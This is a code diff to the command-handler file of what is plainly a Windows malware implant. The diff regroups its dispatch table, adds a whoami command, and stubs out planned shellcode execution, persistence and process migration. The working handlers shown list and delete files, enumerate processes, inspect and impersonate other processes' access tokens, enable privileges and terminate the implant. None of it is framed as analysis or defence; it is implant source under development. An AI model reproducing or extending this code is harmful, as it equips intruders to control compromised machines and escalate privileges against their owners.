@@ -4,19 +4,46 @@
 #define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U
 
 CONST COMMAND_MAP G_CommandTable[] = {
-	{ CMD_KILL,               CmdKillImplant },
+	// Filesystem
+	{ CMD_LS,                 CmdLs },
+	{ CMD_CAT,                CmdCat },
+	{ CMD_MKDIR,              CmdMkdir },
+	{ CMD_RM,                 CmdRm },
+
+	// System Enumeration
+	{ CMD_PS,                 CmdPs },
+	{ CMD_WHOAMI,             CmdWhoami },
+	{ CMD_HOSTNAME,           CmdHostname },
+	{ CMD_GETPID,             CmdGetPid },
+
+	// Execution
+	// { CMD_EXEC,               CmdExec },
+	// { CMD_SHELLCODEEXEC,      CmdShellcodeExec },
+
+	// Token Manipulation
 	{ CMD_INSPECT_TOKEN,      CmdCurrentToken },
 	{ CMD_PROCESS_TOKEN,      CmdProcessToken },
 	{ CMD_TOKEN_PRIVILEGES,   CmdTokenPrivileges },
 	{ CMD_TOKEN_IMPERSONATE,  CmdImpersonateToken },
 	{ CMD_ENABLE_PRIVILEGE,   CmdEnablePrivilege },
-	{ CMD_LS,                 CmdLs },
-	{ CMD_CAT,                CmdCat },
-	{ CMD_MKDIR,              CmdMkdir },
-	{ CMD_RM,                 CmdRm },
-	{ CMD_PS,                 CmdPs },
-	{ CMD_HOSTNAME,           CmdHostname },
-	{ CMD_GETPID,             CmdGetPid }
+	// { CMD_DISABLE_PRIVILEGE,  CmdDisablePrivilege },
+
+	// Memory and Object Inspection
+	// { CMD_MEMREAD,            CmdMemRead },
+	// { CMD_MODULELIST,         CmdModuleList },
+	// { CMD_HANDLELIST,         CmdHandleList },
+
+	// Environment
+	// { CMD_ENV,                CmdEnv },
+	// { CMD_GETENV,             CmdGetEnv },
+	// { CMD_SETENV,             CmdSetEnv },
+
+	// Implant Management
+	// { CMD_SLEEP,              CmdSleep },
+	{ CMD_KILL,               CmdKillImplant },
+	// { CMD_PERSIST,            CmdPersist },
+	// { CMD_UNPERSIST,          CmdUnpersist },
+	// { CMD_MIGRATE,            CmdMigrate }
 };
 
 static DWORD ConvertUtf8ToWideString(
@@ -76,111 +103,6 @@ static DWORD ConvertUtf8ToWideString(
 	return NO_ERROR;
 }
 
-DWORD CmdKillImplant(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	UNREFERENCED_PARAMETER(dataLen);
-	UNREFERENCED_PARAMETER(data);
-
-	*responseData = NULL;
-	*responseLen = 0;
-	RequestImplantTermination();
-
-	return NO_ERROR;
-}
-
-DWORD CmdCurrentToken(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	UNREFERENCED_PARAMETER(dataLen);
-	UNREFERENCED_PARAMETER(data);
-
-	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
-}
-
-DWORD CmdProcessToken(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	DWORD processId = 0;
-
-	if (dataLen < sizeof(DWORD) || data == NULL)
-	{
-		return ERROR_INVALID_REQUEST;
-	}
-
-	processId = *(DWORD*)data;
-	return BuildProcessTokenSummaryResponse(processId, responseData, responseLen);
-}
-
-DWORD CmdTokenPrivileges(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	DWORD processId = 0;
-
-	if (dataLen < sizeof(DWORD) || data == NULL)
-	{
-		return ERROR_INVALID_REQUEST;
-	}
-
-	processId = *(DWORD*)data;
-	return BuildTokenPrivilegesResponse(processId, responseData, responseLen);
-}
-
-DWORD CmdImpersonateToken(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	DWORD processId = 0;
-
-	if (dataLen < sizeof(DWORD) || data == NULL)
-	{
-		return ERROR_INVALID_REQUEST;
-	}
-
-	processId = *(DWORD*)data;
-	return ImpersonateProcessToken(processId, responseData, responseLen);
-}
-
-DWORD CmdEnablePrivilege(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	DWORD status = NO_ERROR;
-	PWSTR privilegeName = NULL;
-
-	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
-	if (status != NO_ERROR)
-	{
-		return status;
-	}
-
-	status = EnableCurrentTokenPrivilege(privilegeName, responseData, responseLen);
-	ImplantHeapFree(privilegeName);
-	return status;
-}
-
 DWORD ExecuteCommandById(
 	DWORD cmdId,
 	DWORD dataLen,
@@ -211,6 +133,8 @@ DWORD ExecuteCommandById(
 	return ERROR_UNKNOWN_COMMAND;
 }
 
+
+//#############################################          Filesystem LS 
 DWORD CmdLs(
 	DWORD dataLen,
 	CONST PBYTE data,
@@ -311,40 +235,33 @@ DWORD CmdRm(
 	PBYTE buffer = NULL;
 	DWORD pathBytes = 0;
 	DWORD totalLength = 0;
-
 	ASSERT(responseData != NULL);
 	ASSERT(responseLen != NULL);
-
 	*responseData = NULL;
 	*responseLen = 0;
-
 	status = ConvertUtf8ToWideString(dataLen, data, &path);
 	if (status != NO_ERROR)
 	{
 		return status;
 	}
-
 	status = DeletePath(path);
-
 	pathBytes = (DWORD)(wcslen(path) + 1) * sizeof(WCHAR);
 	totalLength = sizeof(DWORD) + pathBytes;
-
 	buffer = (PBYTE)ImplantHeapAlloc(totalLength);
 	if (buffer == NULL)
 	{
 		ImplantHeapFree(path);
 		return ERROR_MEMORY_ALLOCATION_FAILED;
 	}
-
 	*(DWORD*)buffer = status;
 	CopyMemory(buffer + sizeof(DWORD), path, pathBytes);
 	ImplantHeapFree(path);
-
 	*responseData = buffer;
 	*responseLen = totalLength;
 	return NO_ERROR;
 }
 
+// system enumeration #########################################################################
 DWORD CmdPs(
 	DWORD dataLen,
 	CONST PBYTE data,
@@ -384,8 +301,7 @@ DWORD CmdPs(
 				((DWORD)wcslen(entry.szExeFile) + 1) * sizeof(WCHAR);
 			bufferSize += sizeof(DWORD) + sizeof(DWORD) + nameBytes;
 			entryCount++;
-		}
-		while (Process32NextW(snapshot, &entry));
+		} while (Process32NextW(snapshot, &entry));
 	}
 
 	CloseHandle(snapshot);
@@ -428,8 +344,7 @@ DWORD CmdPs(
 
 			CopyMemory(buffer + offset, entry.szExeFile, nameBytes);
 			offset += nameBytes;
-		}
-		while (Process32NextW(snapshot, &entry));
+		} while (Process32NextW(snapshot, &entry));
 	}
 
 	CloseHandle(snapshot);
@@ -437,6 +352,18 @@ DWORD CmdPs(
 	*responseData = buffer;
 	*responseLen = offset;
 	return NO_ERROR;
+}
+
+DWORD CmdWhoami(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+	return BuildCurrentUserResponse(responseData, responseLen);
 }
 
 DWORD CmdHostname(
@@ -511,5 +438,118 @@ DWORD CmdGetPid(
 
 	*responseData = buffer;
 	*responseLen = sizeof(DWORD);
+	return NO_ERROR;
+}
+
+
+
+//execution
+// would be env, shellstuff, etc 
+
+//token manpulation ######################################################################
+DWORD CmdCurrentToken(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
+}
+
+DWORD CmdProcessToken(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD processId = 0;
+
+	if (dataLen < sizeof(DWORD) || data == NULL)
+	{
+		return ERROR_INVALID_REQUEST;
+	}
+
+	processId = *(DWORD*)data;
+	return BuildProcessTokenSummaryResponse(processId, responseData, responseLen);
+}
+
+DWORD CmdTokenPrivileges(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD processId = 0;
+
+	if (dataLen < sizeof(DWORD) || data == NULL)
+	{
+		return ERROR_INVALID_REQUEST;
+	}
+
+	processId = *(DWORD*)data;
+	return BuildTokenPrivilegesResponse(processId, responseData, responseLen);
+}
+
+DWORD CmdImpersonateToken(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD processId = 0;
+
+	if (dataLen < sizeof(DWORD) || data == NULL)
+	{
+		return ERROR_INVALID_REQUEST;
+	}
+
+	processId = *(DWORD*)data;
+	return ImpersonateProcessToken(processId, responseData, responseLen);
+}
+
+DWORD CmdEnablePrivilege(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR privilegeName = NULL;
+
+	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	status = EnableCurrentTokenPrivilege(privilegeName, responseData, responseLen);
+	ImplantHeapFree(privilegeName);
+	return status;
+}
+
+
+//#############################################          KILL IMPLANT          #############################################
+DWORD CmdKillImplant(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	*responseData = NULL;
+	*responseLen = 0;
+	RequestImplantTermination();
+
 	return NO_ERROR;
 }
